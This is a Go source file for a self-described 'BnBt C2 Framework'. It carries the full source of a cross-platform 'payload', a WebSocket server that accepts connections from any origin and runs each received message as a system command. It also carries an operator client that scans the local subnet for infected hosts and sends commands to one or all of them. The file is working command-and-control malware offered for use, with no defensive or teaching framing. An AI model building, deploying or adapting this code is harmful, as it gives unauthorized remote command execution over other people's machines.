package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type Config struct {
	IP   string
	Port int
}

var cfg = Config{
	IP:   "0.0.0.0",
	Port: 1234,
}

const clientCode = `
package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

const (
	PORT         = "1234"
	ENDPOINT     = "/ws"
	SCAN_TIMEOUT = 1 * time.Second
)

func main() {
	for {
		servers := findActiveServers()
		if len(servers) == 0 {
			fmt.Println("No active WebSocket servers found.")
			if !askToRetry("Scan again? (y/n): ") {
				break
			}
			continue
		}

		targetIndices := selectTarget(servers)
		if len(targetIndices) == 0 {
			continue
		}

		var targets []string
		if len(targetIndices) > 0 && targetIndices[0] == -1 {
			targets = servers
		} else {
			for _, index := range targetIndices {
				targets = append(targets, servers[index])
			}
		}

		runCommandSession(targets)
	}
}

func findActiveServers() []string {
	fmt.Println("Scanning local network for active WebSocket servers...")

	var servers []string
	var wg sync.WaitGroup
	foundChan := make(chan string, 255)

	ipBase, err := getLocalIPBase()
	if err != nil {
		fmt.Printf("Could not get local IP: %v. Defaulting to 192.168.1.x\n", err)
		ipBase = "192.168.1."
	}
	fmt.Printf("Scanning subnet: %s1-254\n", ipBase)

	dialer := websocket.Dialer{HandshakeTimeout: SCAN_TIMEOUT}

	for i := 1; i <= 254; i++ {
		wg.Add(1)
		ip := fmt.Sprintf("%s%d", ipBase, i)
		go func(host string) {
			defer wg.Done()
			u := url.URL{Scheme: "ws", Host: fmt.Sprintf("%s:%s", host, PORT), Path: ENDPOINT}
			conn, _, err := dialer.Dial(u.String(), nil)
			if err == nil {
				conn.Close()
				foundChan <- u.Host
			}
		}(ip)
	}

	go func() {
		wg.Wait()
		close(foundChan)
	}()

	for server := range foundChan {
		servers = append(servers, server)
	}
	return servers
}

func runCommandSession(targets []string) {
	fmt.Printf("\nConnecting to %d target(s)...\n", len(targets))
	connections := make(map[string]*websocket.Conn)
	var connMutex sync.Mutex

	var wg sync.WaitGroup
	for _, host := range targets {
		wg.Add(1)
		go func(h string) {
			defer wg.Done()
			u := url.URL{Scheme: "ws", Host: h, Path: ENDPOINT}
			conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
			if err != nil {
				fmt.Printf("ERROR: Failed to connect to %s: %v\n", h, err)
				return
			}
			connMutex.Lock()
			connections[h] = conn
			connMutex.Unlock()
			go handleServerResponse(conn)
		}(host)
	}
	wg.Wait()

	if len(connections) == 0 {
		fmt.Println("Failed to establish any connections. Returning to target selection.")
		return
	}
	fmt.Printf("\nSuccessfully connected to %d target(s). Ready for commands.\n", len(connections))
	fmt.Println("(Type '!target' to switch targets, 'exit' to quit)")

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}
		command := scanner.Text()

		if command == "exit" {
			for _, conn := range connections {
				conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
				conn.Close()
			}
			os.Exit(0)
		}
		if command == "!target" || command == "!scan" {
			fmt.Println("Returning to target selection...")
			for _, conn := range connections {
				conn.Close()
			}
			return
		}
		if command == "" {
			continue
		}

		connMutex.Lock()
		for host, conn := range connections {
			err := conn.WriteMessage(websocket.TextMessage, []byte(command))
			if err != nil {
				fmt.Printf("\nERROR: Failed to send command to %s: %v\n", conn.RemoteAddr(), err)
				delete(connections, host)
			}
		}
		connMutex.Unlock()
	}
}

func handleServerResponse(conn *websocket.Conn) {
	defer conn.Close()
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("ERROR [%s]: %v", conn.RemoteAddr(), err)
			}
			fmt.Printf("\n--- Connection Closed [%s] ---\n> ", conn.RemoteAddr())
			break
		}
		fmt.Printf("\n--- Response From [%s] ---\n%s\n> ", conn.RemoteAddr(), string(message))
	}
}

func selectTarget(servers []string) []int {
	if len(servers) == 0 {
		return []int{}
	}
	fmt.Println("\nPlease select a target:")
	fmt.Println("[0] Send to all servers")
	for i, server := range servers {
		fmt.Printf("[%d] %s\n", i+1, server)
	}
	fmt.Println("\nEnter selection (e.g., 1,3 or 0). Type 'scan' to rescan, 'exit' to quit:")
	for {
		fmt.Print("> ")
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		input := strings.TrimSpace(scanner.Text())
		if input == "exit" {
			os.Exit(0)
		}
		if input == "scan" {
			return []int{}
		}

		if input == "0" {
			return []int{-1}
		}

		choicesStr := strings.Split(input, ",")
		var choices []int
		valid := true
		for _, choiceStr := range choicesStr {
			choice, err := strconv.Atoi(strings.TrimSpace(choiceStr))
			if err != nil || choice < 1 || choice > len(servers) {
				fmt.Println("Invalid selection. Please enter a number from the list.")
				valid = false
				break
			}
			choices = append(choices, choice-1)
		}
		if valid {
			return choices
		}
	}
}

func getLocalIPBase() (string, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ip = ip.To4()
			if ip == nil {
				continue
			}
			parts := strings.Split(ip.String(), ".")
			return strings.Join(parts[:3], ".") + ".", nil
		}
	}
	return "", fmt.Errorf("no suitable network interface found")
}

func askToRetry(prompt string) bool {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print(prompt)
		scanner.Scan()
		input := strings.ToLower(strings.TrimSpace(scanner.Text()))
		if input == "y" || input == "yes" {
			return true
		}
		if input == "n" || input == "no" {
			return false
		}
	}
}
`

const serverCode = `
package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func handleMessage(message string) string {
	parts := strings.Fields(strings.TrimSpace(message))
	if len(parts) == 0 {
		return "Error: Empty command received.\n"
	}

	var cmd *exec.Cmd
	if len(parts) == 1 {
		cmd = exec.Command(parts[0])
	} else {
		cmd = exec.Command(parts[0], parts[1:]...)
	}

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		if stderr.Len() > 0 {
			return fmt.Sprintf("Command error: %s", stderr.String())
		}
		return fmt.Sprintf("Execution error: %v\n", err)
	}

	if out.Len() == 0 {
		return "Command executed successfully with no output.\n"
	}

	return out.String()
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Upgrade error:", err)
		return
	}
	defer conn.Close()
	fmt.Println("New client connected:", conn.RemoteAddr())

	for {
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("Unexpected close error: %v", err)
			}
			fmt.Println("Client connection closed:", conn.RemoteAddr())
			break
		}

		if messageType == websocket.TextMessage {
			command := string(p)
			fmt.Printf("Received command from [%s]: %s\n", conn.RemoteAddr(), command)

			response := handleMessage(command)

			err = conn.WriteMessage(websocket.TextMessage, []byte(response))
			if err != nil {
				log.Println("Write error:", err)
				break
			}
		}
	}
}

func main() {
	http.HandleFunc("/ws", wsHandler)

	fmt.Println("WebSocket server listening on port 1234... Endpoint: /ws")
	log.Fatal(http.ListenAndServe(":1234", nil))
}
`

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	for {
		clear()
		fmt.Println("\033[38;5;198mBnBt C2 Framework\033[0m")
		fmt.Println("|")
		fmt.Println("|-> Configure [0]")
		fmt.Println("|-> Run Client [1]")
		fmt.Println("|-> Build Payload [2]")
		fmt.Println("|-> Quit [q]")
		fmt.Print("Enter option: ")

		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "0":
			Configure(reader)
		case "1":
			runClient()
		case "2":
			buildPayload(reader)
		case "q", "quit", "exit":
			clear()
			fmt.Println("Exiting.")
			return
		default:
			fmt.Println("Invalid option.")
			time.Sleep(1 * time.Second)
		}
	}
}

func Configure(r *bufio.Reader) {
	for {
		clear()
		fmt.Println("\033[38;5;198mC2 Framework - Configure\033[0m")
		fmt.Println("|")
		fmt.Printf("|-> IP: %s\n", cfg.IP)
		fmt.Printf("|-> Port: %d\n", cfg.Port)
		fmt.Println("|")
		fmt.Println("|-> Set IP [1]")
		fmt.Println("|-> Set Port [2]")
		fmt.Println("|-> Back [b]")
		fmt.Print("Enter option: ")

		input, _ := r.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			fmt.Print("Enter IP address: ")
			ip, _ := r.ReadString('\n')
			cfg.IP = strings.TrimSpace(ip)
			fmt.Println("IP set to:", cfg.IP)
			time.Sleep(1 * time.Second)

		case "2":
			fmt.Print("Enter port number: ")
			portStr, _ := r.ReadString('\n')
			port, err := strconv.Atoi(strings.TrimSpace(portStr))
			if err != nil || port < 1 || port > 65535 {
				fmt.Println("Invalid port. Must be between 1 and 65535.")
				time.Sleep(2 * time.Second)
				continue
			}
			cfg.Port = port
			fmt.Println("Port set to:", cfg.Port)
			time.Sleep(1 * time.Second)

		case "b", "back":
			return

		default:
			fmt.Println("Invalid option.")
			time.Sleep(1 * time.Second)
		}
	}
}

func runClient() {
	clear()
	fmt.Println("Running scanner and command client...")

	tmpfile, err := ioutil.TempFile("", "client-*.go")
	if err != nil {
		log.Fatalf("Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write([]byte(clientCode)); err != nil {
		log.Fatalf("Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("Failed to close temp file: %v", err)
	}

	cmd := exec.Command("go", "run", tmpfile.Name())
	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	cmd.Stderr = os.Stderr
	cmd.Run()

	fmt.Println("\nClient finished. Press 'Enter' to return to the main menu.")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func buildPayload(r *bufio.Reader) {
	for {
		clear()
		fmt.Println("\033[38;5;198mC2 Framework - Build Payload\033[0m")
		fmt.Println("|")
		fmt.Println("|-> Save as .go file [1]")
		fmt.Println("|-> Build for Windows [2]")
		fmt.Println("|-> Build for Linux [3]")
		fmt.Println("|-> Build for macOS [4]")
		fmt.Println("|-> Back [b]")
		fmt.Print("Enter option: ")

		input, _ := r.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			saveGoFile("payload.go", serverCode)
		case "2":
			compilePayload("windows", "amd64", "payload.exe")
		case "3":
			compilePayload("linux", "amd64", "payload")
		case "4":
			compilePayload("darwin", "amd64", "payload_mac")
		case "b", "back":
			return
		default:
			fmt.Println("Invalid option.")
		}
		time.Sleep(2 * time.Second)
	}
}

func saveGoFile(filename, code string) {
	fmt.Printf("Saving payload as %s...\n", filename)
	if err := ioutil.WriteFile(filename, []byte(code), 0644); err != nil {
		fmt.Printf("Error saving file: %v\n", err)
		return
	}
	fmt.Printf("Successfully saved %s\n", filename)
}

func compilePayload(goos, goarch, outputName string) {
	fmt.Printf("Building payload for %s/%s...\n", goos, goarch)

	tmpfile, err := ioutil.TempFile("", "server-*.go")
	if err != nil {
		log.Fatalf("Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write([]byte(serverCode)); err != nil {
		log.Fatalf("Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("Failed to close temp file: %v", err)
	}

	cmd := exec.Command("go", "build", "-o", outputName, tmpfile.Name())
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
	)

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("Error building payload: %v\n", err)
		fmt.Printf("Compiler error: %s\n", stderr.String())
		return
	}

	fmt.Printf("Successfully built %s\n", outputName)
}
